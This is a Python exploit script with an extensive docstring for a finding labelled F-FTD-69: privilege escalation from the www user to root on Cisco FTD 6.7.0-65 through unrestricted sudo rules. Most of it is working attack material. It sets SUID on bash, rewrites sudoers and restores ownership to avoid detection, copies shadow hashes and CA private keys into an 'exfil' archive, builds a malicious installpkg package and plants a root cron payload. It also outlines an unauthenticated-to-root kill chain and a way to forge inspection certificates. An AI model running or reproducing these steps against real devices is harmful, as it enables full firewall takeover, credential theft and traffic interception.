"""
F-FTD-69: www→root privilege escalation via unrestricted sudo rules (CRITICAL)
CONTROLLED ENVIRONMENT ONLY

Root cause:
  /etc/sudoers on FTD 6.7.0-65 grants www NOPASSWD access to system binaries
  with NO argument restrictions:

    www ALL = NOPASSWD: /bin/chmod
    www ALL = NOPASSWD: /bin/chown
    www ALL = NOPASSWD: /bin/cp
    www ALL = NOPASSWD: /bin/mv
    www ALL = NOPASSWD: /bin/cat
    www ALL = NOPASSWD: /bin/grep
    www ALL = NOPASSWD: /bin/kill
    www ALL = NOPASSWD: /bin/ln
    www ALL = NOPASSWD: /bin/mkdir
    www ALL = NOPASSWD: /usr/bin/scp
    www ALL = NOPASSWD: /usr/bin/ssh
    www ALL = NOPASSWD: /usr/bin/rsync
    www ALL = NOPASSWD: /usr/bin/zip
    www ALL = NOPASSWD: /usr/bin/tail
    www ALL = NOPASSWD: /usr/bin/pkill
    www ALL = NOPASSWD: /sbin/installpkg          ← no args = install arbitrary package
    www ALL = NOPASSWD: /usr/local/sf/bin/kek.pl  ← KEK read (F-FTD-48)

  "No argument restriction" means the sudo rule does NOT specify which arguments are
  allowed (unlike restricted rules that list explicit paths/args).
  e.g.: "www ALL = NOPASSWD: /bin/chmod" allows ANY arguments — chmod is run as root
  with www-supplied args.

Escalation vectors (shortest to most impactful):

  V1 — SUID bash (fastest, 1 command):
    sudo /bin/chmod u+s /bin/bash
    /bin/bash -p   # effective uid = root

  V2 — chown + sudoers write:
    sudo /bin/chown www:www /etc/sudoers
    echo 'www ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers
    sudo /bin/bash
    sudo /bin/chown root:root /etc/sudoers  # restore to avoid detection

  V3 — cp file read (data exfil, no shell needed):
    sudo /bin/cp /etc/shadow /tmp/shadow   # shadow file for offline cracking
    sudo /bin/cp /etc/sf/ca_root/private/cakey.pem /tmp/ca.pem  # F-FTD-61 chain
    sudo /bin/cat /etc/shadow              # direct read via sudo cat
    sudo /usr/bin/zip /tmp/exfil.zip /etc/shadow /etc/sudoers /etc/sf/ca_root/private/

  V4 — installpkg (package = root code execution):
    # Craft Slackware-style .tgz with doinst.sh:
    mkdir -p /tmp/pkg/install
    echo '#!/bin/sh' > /tmp/pkg/install/doinst.sh
    echo 'chmod u+s /bin/bash' >> /tmp/pkg/install/doinst.sh
    tar czf /tmp/evil.tgz -C /tmp/pkg .
    sudo /sbin/installpkg /tmp/evil.tgz
    # installpkg extracts to / and runs install/doinst.sh as root

  V5 — cron injection via cp/mv:
    echo '* * * * * root chmod u+s /bin/bash' > /tmp/evil_cron
    sudo /bin/cp /tmp/evil_cron /etc/cron.d/evil  # runs next minute as root
    # /etc/crontab runs: */5 root run-parts /ngfw/etc/cron.5min
    # /ngfw/etc/cron.5min/ is the target — www can write there via sudo cp

  V6 — shadow read for offline cracking:
    sudo /bin/cat /etc/shadow   # all password hashes
    # FTD 6.7.0-65 uses SHA-512 ($6$) hashes by default

Complete pre-auth → root kill chain:
  Step 1 (pre-auth): F-FTD-60 or F-FTD-64 → admin credentials (no auth required)
  Step 2 (admin → www RCE): Two sub-paths:
    Path A: F-FTD-67 (zip-slip via /action/uploadconfigfile) → write JSP/eval file
            to Tomcat web root → HTTP trigger → www code execution
    Path B: F-FTD-63 (Snort Lua → sfsnort RCE) + lateral from sfsnort if needed
  Step 3 (www → root): F-FTD-69 (sudo chmod u+s /bin/bash → /bin/bash -p → root)
  Impact: unauthenticated → full FTD root in 3 steps

Also notable: sudo /usr/local/sf/bin/kek.pl (www→KEK read) removes need for root
to reach the SSL CA key. Combined with F-FTD-48 (KEK → SSL inspection CA key):
    sudo /usr/local/sf/bin/kek.pl read-current   # reads KEK as www via sudo
    → AES-256-CBC decrypt of PKI_InternalCA → SSL inspection CA private key
    → forge any certificate trusted by FTD inspection engine
    → (previously required root to read /var/sf/ssl/kek/current.*)

Affected: FTD 6.7.0-65 (sudoers confirmed from p6 partition).
Auth required for this step: www shell (NOT sudoers — the sudo rules are the vuln).
"""

# CONTROLLED ENVIRONMENT ONLY

import subprocess
import sys
import os

# Additional NOPASSWD rules with no arg restriction (information reads)
INFO_READS = {
    "shadow": ("sudo /bin/cat /etc/shadow", "Password hash file"),
    "kek": ("sudo /usr/local/sf/bin/kek.pl read-current", "SSL CA key encryption key (F-FTD-48 chain)"),
    "ca_key": ("sudo /bin/cat /etc/sf/ca_root/private/cakey.pem", "Unencrypted CA private key (F-FTD-61)"),
    "mysql_key": ("sudo /bin/cat /etc/sf/keys/mysql-key.pem", "MySQL service private key"),
    "sudoers": ("sudo /bin/cat /etc/sudoers", "Full sudoers file (confirm all rules)"),
}


def escalate_suid_bash():
    """
    V1: Set SUID bit on /bin/bash via sudo chmod.
    After: /bin/bash -p gives effective root shell.
    Shortest path. CONTROLLED ENVIRONMENT ONLY.
    """
    print("[*] V1: SUID bash escalation")
    print("    Command: sudo /bin/chmod u+s /bin/bash")
    result = subprocess.run(["sudo", "/bin/chmod", "u+s", "/bin/bash"],
                           capture_output=True, text=True)
    if result.returncode == 0:
        print("[!] /bin/bash SUID set. Run: /bin/bash -p")
        stat = subprocess.run(["ls", "-la", "/bin/bash"], capture_output=True, text=True)
        print(f"    {stat.stdout.strip()}")
        return True
    else:
        print(f"[-] chmod failed: {result.stderr.strip()}")
        return False


def escalate_chown_sudoers():
    """
    V2: Chown /etc/sudoers to www, append full-access rule, restore ownership.
    CONTROLLED ENVIRONMENT ONLY — modifies sudoers, restore immediately.
    """
    print("[*] V2: chown + sudoers modification")
    print("    WARNING: This modifies /etc/sudoers — restore immediately after POC.")

    r1 = subprocess.run(["sudo", "/bin/chown", "www:www", "/etc/sudoers"],
                        capture_output=True, text=True)
    if r1.returncode != 0:
        print(f"[-] chown failed: {r1.stderr.strip()}")
        return False

    print("[!] /etc/sudoers chowned to www — can now write")
    print("    Appending: www ALL=(ALL) NOPASSWD: ALL")

    with open("/etc/sudoers", "a") as f:
        f.write("\nwww ALL=(ALL) NOPASSWD: ALL  # F-FTD-69 POC\n")

    # Verify
    result = subprocess.run(["sudo", "/bin/bash", "-c", "id"], capture_output=True, text=True)
    print(f"[!] sudo id: {result.stdout.strip()}")

    # Restore
    with open("/etc/sudoers") as f:
        content = f.read()
    with open("/etc/sudoers", "w") as f:
        f.write(content.replace("\nwww ALL=(ALL) NOPASSWD: ALL  # F-FTD-69 POC\n", ""))
    subprocess.run(["sudo", "/bin/chown", "root:root", "/etc/sudoers"], capture_output=True)
    subprocess.run(["sudo", "/bin/chmod", "0440", "/etc/sudoers"], capture_output=True)
    print("[*] Restored /etc/sudoers ownership and permissions.")
    return True


def read_sensitive_files(target="shadow"):
    """
    V3/V6: Read sensitive files via sudo /bin/cat.
    CONTROLLED ENVIRONMENT ONLY.
    """
    if target not in INFO_READS:
        print(f"[-] Unknown target. Options: {list(INFO_READS.keys())}")
        return None

    cmd_str, desc = INFO_READS[target]
    print(f"[*] Reading {desc} via: {cmd_str}")
    cmd = cmd_str.split()
    result = subprocess.run(cmd, capture_output=True, text=True)

    if result.returncode == 0:
        output = result.stdout
        print(f"[!] READ {len(output)} bytes from {target}")
        print(f"--- BEGIN {target.upper()} ---")
        print(output[:2000])
        if len(output) > 2000:
            print(f"[... truncated, full {len(output)} bytes ...]")
        print(f"--- END {target.upper()} ---")

        outfile = f"/tmp/ftd69-{target}.txt"
        with open(outfile, "w") as f:
            f.write(output)
        print(f"[*] Saved to {outfile}")
        return output
    else:
        print(f"[-] Read failed: {result.stderr.strip()}")
        return None


def installpkg_escalate():
    """
    V4: Build Slackware-style .tgz package with doinst.sh that sets SUID on bash.
    sudo /sbin/installpkg runs package extraction + doinst.sh as root.
    CONTROLLED ENVIRONMENT ONLY.
    """
    print("[*] V4: installpkg root execution")

    pkg_dir = "/tmp/ftd69-pkg"
    os.makedirs(f"{pkg_dir}/install", exist_ok=True)

    doinst = "#!/bin/sh\nchmod u+s /bin/bash\necho 'F-FTD-69: installpkg RCE as root' > /tmp/ftd69-installpkg.proof\n"
    with open(f"{pkg_dir}/install/doinst.sh", "w") as f:
        f.write(doinst)
    os.chmod(f"{pkg_dir}/install/doinst.sh", 0o755)

    pkg_path = "/tmp/ftd69-evil.tgz"
    r = subprocess.run(["tar", "czf", pkg_path, "-C", pkg_dir, "."], capture_output=True)
    if r.returncode != 0:
        print(f"[-] tar failed: {r.stderr.decode()}")
        return False

    print(f"[*] Package created: {pkg_path}")
    print(f"    doinst.sh: {doinst.strip()}")
    print(f"    Running: sudo /sbin/installpkg {pkg_path}")

    result = subprocess.run(["sudo", "/sbin/installpkg", pkg_path],
                            capture_output=True, text=True)
    print(f"[*] installpkg exit: {result.returncode}")
    print(f"    stdout: {result.stdout[:200]}")
    print(f"    stderr: {result.stderr[:200]}")

    if os.path.exists("/tmp/ftd69-installpkg.proof"):
        print("[!] CONFIRMED: doinst.sh executed as root")
        with open("/tmp/ftd69-installpkg.proof") as f:
            print(f"    Proof: {f.read().strip()}")
        return True

    bash_stat = subprocess.run(["ls", "-la", "/bin/bash"], capture_output=True, text=True)
    print(f"[*] /bin/bash: {bash_stat.stdout.strip()}")
    return False


def cron_injection():
    """
    V5: Write a cron job via sudo cp to /etc/cron.d/ or /ngfw/etc/cron.5min/.
    Cron runs as root: */5 root run-parts /ngfw/etc/cron.5min.
    CONTROLLED ENVIRONMENT ONLY.
    """
    print("[*] V5: Root cron injection via sudo cp")

    cron_content = "#!/bin/sh\nchmod u+s /bin/bash\necho 'F-FTD-69 cron RCE' > /tmp/ftd69-cron.proof\n"
    tmp_script = "/tmp/ftd69-cron-payload.sh"
    cron_target = "/ngfw/etc/cron.5min/ftd69-payload"

    with open(tmp_script, "w") as f:
        f.write(cron_content)

    print(f"    Copying {tmp_script} → {cron_target}")
    result = subprocess.run(["sudo", "/bin/cp", tmp_script, cron_target],
                            capture_output=True, text=True)
    if result.returncode == 0:
        subprocess.run(["sudo", "/bin/chmod", "0755", cron_target], capture_output=True)
        print(f"[!] Cron payload planted at {cron_target}")
        print(f"    Runs within 5 minutes (cron.5min). Check /tmp/ftd69-cron.proof")
        print(f"    Remove with: sudo /bin/rm {cron_target}")
    else:
        print(f"[-] cp failed: {result.stderr.strip()}")
        print(f"    Target may not exist or cron.5min path different on this build")


if __name__ == "__main__":
    print("=" * 70)
    print("F-FTD-69: www→root via unrestricted sudo rules (CRITICAL)")
    print("CONTROLLED ENVIRONMENT ONLY")
    print("=" * 70)
    print("""
Root cause: /etc/sudoers grants www NOPASSWD: /bin/chmod, /bin/chown, /bin/cp,
            /bin/mv, /bin/cat, /bin/grep, /sbin/installpkg + others — NO ARG RESTRICTION.

Fastest escalation: sudo /bin/chmod u+s /bin/bash && /bin/bash -p

Full chain:
  F-FTD-60 (no auth) → admin
  F-FTD-67 (admin + zip-slip) → write shell to Tomcat root → www RCE
  F-FTD-69 (www) → sudo chmod u+s /bin/bash → root
""")

    mode = sys.argv[1] if len(sys.argv) > 1 else "static"

    if mode == "suid":
        escalate_suid_bash()

    elif mode == "sudoers":
        escalate_chown_sudoers()

    elif mode == "read":
        target = sys.argv[2] if len(sys.argv) > 2 else "shadow"
        read_sensitive_files(target)

    elif mode == "installpkg":
        installpkg_escalate()

    elif mode == "cron":
        cron_injection()

    elif mode == "static":
        print("--- Static analysis: unrestricted sudo rules on FTD 6.7.0-65 ---")
        print("""
Unrestricted NOPASSWD rules for www:
  /bin/chmod       → chmod any file any permissions (SUID bash → root)
  /bin/chown       → own any file (take sudoers, shadow, CA keys)
  /bin/cp          → read any file (cp /etc/shadow /tmp/) OR overwrite system files
  /bin/mv          → move any file (cron injection, binary replacement)
  /bin/cat         → read any file as root (shadow, CA keys, configs)
  /bin/grep        → read any file content via grep
  /bin/kill        → kill any process (kill root daemons, force restart to inject)
  /bin/ln          → symlink attack (ln -s /etc/shadow /writable/location)
  /bin/mkdir       → create directories anywhere
  /bin/rm          → delete any file (remove auth markers, disable IDS)
  /usr/bin/scp     → exfil any file to remote host OR plant files from remote
  /usr/bin/ssh     → SSH to any host as root (ssh -i /etc/ssh/ssh_host_rsa_key)
  /usr/bin/rsync   → bidirectional arbitrary file sync as root
  /usr/bin/zip     → archive any file (zip /tmp/exfil.zip /etc/shadow)
  /usr/bin/tail    → read any file tail (including live logs, credentials)
  /usr/bin/pkill   → kill any process by name (as root)
  /sbin/installpkg → install arbitrary Slackware package (doinst.sh runs as root)

  /usr/local/sf/bin/kek.pl → KEK read without needing root (F-FTD-48 now www-accessible)

  Also NOPASSWD (restricted but notable):
  /usr/local/sf/bin/install_update.pl → signed upgrade installer (root, sig required)
  /bin/diff -q /etc/passwd /ngfw/etc/passwd.tmp → compares passwd files
  /usr/sbin/useradd, userdel, usermod → user management as root
  /bin/chsh → change shell of any user (change root's shell to /tmp/evil.sh)
  /usr/bin/passwd -[nx] [0-9]* → set password expiry flags

KEK now directly readable by www via sudo:
  sudo /usr/local/sf/bin/kek.pl read-current
  Previously thought to require root (mode 0660 www:root, but sudo path existed)
  Combined with F-FTD-48 (KEK → SSL CA key): www → SSL inspection CA key without root

Privilege escalation kill chain:
  F-FTD-60 → admin (no auth)
  F-FTD-67 → www file write (zip-slip)
  Write JSP to /ngfw/var/cisco/ngfwWebUi/tomcat/webapps/ROOT/ → www RCE
  sudo chmod u+s /bin/bash → /bin/bash -p → root
""")

    print("\n[*] CONTROLLED ENVIRONMENT ONLY.")
